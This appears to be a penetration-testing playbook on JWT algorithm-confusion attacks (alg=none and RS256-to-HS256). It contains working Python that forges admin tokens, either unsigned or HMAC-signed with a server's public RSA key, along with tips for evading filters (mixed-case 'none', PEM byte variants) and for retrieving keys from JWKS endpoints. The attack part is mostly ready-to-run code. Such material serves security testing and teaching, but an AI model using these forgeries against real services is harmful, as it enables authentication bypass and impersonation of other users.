# JWT alg Confusion (alg=none, RS256→HS256)

## When this applies

- Service issues and validates JWTs (JSON Web Tokens), and you can submit a JWT in `Authorization: Bearer …`, cookie, or query parameter.
- The verification routine reads `alg` from the JWT header and dispatches to a per-algorithm verifier — without enforcing which algorithm is allowed.
- Trigger keywords: "JWT", "JSON Web Token", "alg=none", "RS256/HS256 confusion", `jsonwebtoken` Node, `pyjwt`, `jjwt`.
- Cross-link: [skills/authentication/reference/jwt-quickstart.md](../../../../authentication/reference/jwt-quickstart.md) covers the same family from the auth-bypass angle.

## Technique

Two classic confusions:

1. **`alg: none`.** Submit a token with `{"alg":"none"}` and an empty signature. Old verifiers honor this and accept any payload.
2. **`alg` switch RS256 → HS256.** RS256 verifies with the server's RSA public key. HS256 verifies an HMAC-SHA256 of the token using a shared secret. If the verifier accepts `HS256` from a token but uses the **public RSA key bytes** as the HMAC key (because both arrive as a single "key" parameter), an attacker who knows the public key can compute the valid HS256 MAC and forge tokens.

## Steps

### 1. Capture a valid JWT

Decode header and payload with base64url:

```python
import base64, json
def b64url(x):
    return base64.urlsafe_b64decode(x + '=' * (-len(x) % 4))
header = json.loads(b64url(jwt.split('.')[0]))
payload = json.loads(b64url(jwt.split('.')[1]))
```

### 2. Try `alg: none`

```python
import json, base64
def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

new_header = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
new_payload = b64u(json.dumps({"sub":"admin","role":"admin"}).encode())
forged = f"{new_header}.{new_payload}."   # empty signature
```

Submit `forged`. Modern libs reject; older Node/PHP libs accept.

### 3. Obtain RSA public key (for RS256→HS256)

Servers commonly publish the key at `/.well-known/jwks.json`, `/.well-known/openid-configuration`, or as a PEM in static assets. If the public key isn't published, derive it from two signed tokens (RSA recovery from signatures: `jwt-key-recovery` techniques).

### 4. RS256 → HS256 forgery

Compute the HMAC using the public key bytes (the **PEM string including header/footer and newlines**, exactly as the server stores it):

```python
import hmac, hashlib

with open('server_pub.pem','rb') as f:
    key_bytes = f.read()           # exact bytes server uses

new_header = b64u(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
new_payload = b64u(json.dumps({"sub":"admin","role":"admin"}).encode())
signing_input = f"{new_header}.{new_payload}".encode()
sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
forged = f"{new_header}.{new_payload}.{b64u(sig)}"
```

Iterate over key formats: try DER bytes, PEM with/without trailing newline, X.509 SubjectPublicKeyInfo blob, RSA modulus+exponent JWK string. Each may match the server's exact storage.

### 5. Send and observe

If the server accepts, you've impersonated whoever the payload claims to be. Set `sub` / `role` / `exp` accordingly.

## Verifying success

- Server accepts the forged token and returns admin-only or impersonated data.
- `/me` or session endpoint reflects the forged identity.
- For audit: keep the original token + the forged one as paired evidence.

## Common pitfalls

- **PEM whitespace.** Servers store the public key with specific newlines (`\n` vs `\r\n`); the HMAC must use the exact byte string. Try with and without trailing newline.
- **Mixed-case `none`.** Some libs reject `"none"` but accept `"None"`, `"NONE"`, `"nOnE"` — try variants.
- **Strict libraries.** Most modern libs (`jsonwebtoken` ≥9, `pyjwt` ≥2, `jose-jwt`) reject algorithm switches by default. Older versions or misconfigurations are required.
- **Asymmetric key as HMAC key requires server bug.** The fundamental confusion happens server-side; you can't trigger it if the server explicitly passes the algorithm to the verifier.
- **Key ID confusion (`kid`).** A separate attack — `kid` parameter SQLi or LFI to make the verifier load a key the attacker controls. See `kid` injection sub-techniques.

## Tools

- `jwt_tool` (https://github.com/ticarpi/jwt_tool) — automates `none`, `kid`, alg-confusion, JWKS spoofing.
- `pyjwt`, `jose-jwt` — for hand-crafted forgery.
- Burp `JWT Editor` extension for in-flight modification.
- For the public key fetch: `curl https://target/.well-known/jwks.json | jq` then convert with `jwk-to-pem`.
